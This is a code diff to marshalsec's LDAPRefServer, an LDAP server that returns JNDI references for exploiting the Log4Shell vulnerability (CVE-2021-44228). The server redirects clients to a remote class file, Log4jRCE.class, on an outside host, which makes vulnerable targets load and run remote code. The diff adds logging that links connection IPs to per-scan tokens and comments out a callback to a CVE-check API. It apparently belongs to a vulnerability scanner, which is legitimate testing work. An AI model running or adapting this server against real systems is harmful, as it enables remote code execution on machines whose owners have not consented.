@@ -25,13 +25,27 @@ package marshalsec.jndi;
 import java.net.InetAddress;
 import java.net.MalformedURLException;
 import java.net.ProtocolException;
+import java.net.ServerSocket;
+import java.net.Socket;
 import java.net.URL;
+import java.net.UnknownHostException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.List;
+import java.util.concurrent.atomic.AtomicLong;
+import java.util.logging.ConsoleHandler;
+import java.util.logging.Handler;
 import java.net.HttpURLConnection;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
+import java.lang.reflect.Array;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
+import java.util.logging.Level;
+import java.util.logging.LogRecord;
+import java.util.logging.SimpleFormatter;
+import java.util.regex.*;
 
 import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
@@ -40,14 +54,32 @@ import javax.net.ssl.SSLSocketFactory;
 import com.unboundid.ldap.listener.InMemoryDirectoryServer;
 import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
 import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.InMemoryRequestHandler;
+import com.unboundid.ldap.listener.LDAPListenerClientConnection;
+import com.unboundid.ldap.listener.LDAPListenerConfig;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.protocol.AddRequestProtocolOp;
+import com.unboundid.ldap.protocol.BindRequestProtocolOp;
+import com.unboundid.ldap.protocol.CompareRequestProtocolOp;
+import com.unboundid.ldap.protocol.DeleteRequestProtocolOp;
+import com.unboundid.ldap.protocol.ExtendedRequestProtocolOp;
+import com.unboundid.ldap.protocol.LDAPMessage;
+import com.unboundid.ldap.protocol.ModifyDNRequestProtocolOp;
+import com.unboundid.ldap.protocol.ModifyRequestProtocolOp;
+import com.unboundid.ldap.protocol.SearchRequestProtocolOp;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSimpleBindRequest;
+import com.fasterxml.jackson.annotation.JsonProperty.Access;
+import com.unboundid.ldap.listener.AccessLogRequestHandler;
+import com.unboundid.ldap.listener.LDAPListenerRequestHandler;
+import com.unboundid.ldap.sdk.Control;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPException;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
+import com.unboundid.util.Validator;
 
+import java.util.ArrayList;
 
 /**
  * LDAP server implementation returning JNDI references
@@ -57,8 +89,14 @@ import com.unboundid.ldap.sdk.ResultCode;
  */
 public class LDAPRefServer {
 
-    private static final String LDAP_BASE = "dc=example,dc=com";
+    private static class LDAPConn {
+        public String connid;
+        public String ipaddress;
+        public String token;
+    }
 
+    private static final String LDAP_BASE = "dc=example,dc=com";
+    public static List<LDAPConn> connections = new ArrayList<LDAPConn>();
 
     public static void main ( String[] args ) {
         int port = 1389;
@@ -71,6 +109,9 @@ public class LDAPRefServer {
         }
 
         try {
+            customHandler handler = new customHandler();
+            handler.setFormatter(new SimpleFormatter());
+            handler.setLevel(Level.ALL);
             InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
             config.setListenerConfigs(new InMemoryListenerConfig(
                 "listen", //$NON-NLS-1$
@@ -79,8 +120,8 @@ public class LDAPRefServer {
                 ServerSocketFactory.getDefault(),
                 SocketFactory.getDefault(),
                 (SSLSocketFactory) SSLSocketFactory.getDefault()));
-
             config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
+            config.setAccessLogHandler(handler);
             InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
             System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
             ds.startListening();
@@ -91,23 +132,104 @@ public class LDAPRefServer {
         }
     }
 
+    private static class customHandler extends Handler {
+
+        @Override
+        public void close() throws SecurityException {
+            
+        }
+
+        @Override
+        public void flush() {
+            
+        }
+
+        @Override
+        public void publish(LogRecord arg0) {
+            try
+            {
+                //System.out.println(arg0.getMessage());
+                Pattern pattern = Pattern.compile("(CONNECT conn=)(\\d+) (from=\")(\\d+.\\d+.\\d+.\\d+)(.*)", Pattern.CASE_INSENSITIVE);
+                Matcher matcher = pattern.matcher(arg0.getMessage());
+                boolean found = matcher.find();
+                if(found)
+                {
+                    LDAPConn con = new LDAPConn();
+                    con.connid = matcher.group(2);
+                    con.ipaddress = matcher.group(4);
+                    // System.out.println(con.connid);
+                    // System.out.println(con.ipaddress);
+                    connections.add(con);
+                }
+
+                Pattern pattern2 = Pattern.compile("(SEARCH REQUEST conn=)(\\d+) (.*)(base=\")(.*)(\" scope.*)");
+                Matcher matcher2 = pattern2.matcher(arg0.getMessage());
+                boolean found2 = matcher2.find();
+                if(found2)
+                {
+                    // System.out.println(matcher2.group(2));
+                    // System.out.println(matcher2.group(5));
+                    connections.forEach((conn) -> {
+                        // System.out.println(conn.connid);
+                        if(conn.connid.equals(matcher2.group(2)))
+                        {
+                            conn.token = matcher2.group(5);
+                            System.out.println("Matches connection ID: " + conn.connid + " with Token : " + conn.token + " with IP Address: " + conn.ipaddress);
+                        }
+                    });
+                    //  //Hacer peticion a API de Threats para notificar que es vulnerable
+                    //  URL url = new URL ("https://api.threats.kapa7.com/api/CVEChecks/cve_2021_44228");
+                    //  try
+                    //  {
+                    //      HttpURLConnection con = (HttpURLConnection)url.openConnection();
+                    //      con.setRequestMethod("POST");
+                    //      con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                    //      con.setRequestProperty("Accept", "application/json");
+                    //      con.setDoOutput(true);
+                    //      String jsonInputString = "token=" + base;
+                        
+                    //      OutputStreamWriter wr = new OutputStreamWriter(con.getOutputStream());
+                    //      wr.write(jsonInputString);
+                    //      wr.flush();
+                    //      wr.close();
+
+                    //      try(BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream(), "utf-8"))) 
+                    //      {
+                    //          StringBuilder response = new StringBuilder();
+                    //          String responseLine = null;
+                    //          while ((responseLine = br.readLine()) != null) {
+                    //              response.append(responseLine.trim());
+                    //          }
+                    //          System.out.println(response.toString());
+                    //      }
+                    //      catch(Exception ex)
+                    //      {
+                    //          System.out.println(ex.getMessage());
+                    //      }
+                    //  }
+                    //  catch(Exception ex)
+                    //  {
+                    //      System.out.println(ex.getMessage());
+                    //  }
+                }
+            }
+            catch(Exception ex)
+            {
+                //System.out.println(ex.getMessage());
+            }
+        }
+
+    }
+
     private static class OperationInterceptor extends InMemoryOperationInterceptor {
 
         private URL codebase;
-        private String remoteAddress;
 
         /**
          * 
          */
         public OperationInterceptor ( URL cb ) {
             this.codebase = cb;
-        }
-
-        @Override
-        public void processSimpleBindRequest(InMemoryInterceptedSimpleBindRequest request) throws LDAPException
-        {
-            this.remoteAddress = request.getConnectedAddress();
-            System.out.println("Remote Address : " + request.getConnectedAddress());
         }
 
 
@@ -133,41 +255,6 @@ public class LDAPRefServer {
         protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
             
             URL turl = new URL("https://threats.kapa7.com/assets/Log4jRCE.class");
-
-            //Hacer peticion a API de Threats para notificar que es vulnerable
-            URL url = new URL ("https://api.threats.kapa7.com/api/CVEChecks/cve_2021_44228");
-            try
-            {
-                HttpURLConnection con = (HttpURLConnection)url.openConnection();
-                con.setRequestMethod("POST");
-                con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-                con.setRequestProperty("Accept", "application/json");
-                con.setDoOutput(true);
-                String jsonInputString = "token=" + base;
-                
-                OutputStreamWriter wr = new OutputStreamWriter(con.getOutputStream());
-                wr.write(jsonInputString);
-                wr.flush();
-                wr.close();
-
-                try(BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream(), "utf-8"))) 
-                {
-                    StringBuilder response = new StringBuilder();
-                    String responseLine = null;
-                    while ((responseLine = br.readLine()) != null) {
-                        response.append(responseLine.trim());
-                    }
-                    System.out.println(response.toString());
-                }
-                catch(Exception ex)
-                {
-                    System.out.println(ex.getMessage());
-                }
-            }
-            catch(Exception ex)
-            {
-                System.out.println(ex.getMessage());
-            }
 
             System.out.println("Send LDAP reference result for token " + base + ", redirecting to " + turl);
             // e.addAttribute("javaClassName", "foo");
